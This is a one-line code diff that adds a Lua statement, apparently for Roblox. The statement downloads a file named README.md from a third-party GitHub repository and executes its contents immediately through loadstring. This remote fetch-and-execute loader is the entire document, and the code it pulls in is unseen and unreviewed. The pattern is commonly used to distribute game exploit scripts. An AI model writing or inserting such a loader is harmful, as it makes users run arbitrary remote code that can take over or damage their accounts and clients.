@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowSphereBetaV1/ShadowSphere/main/README.md"))()
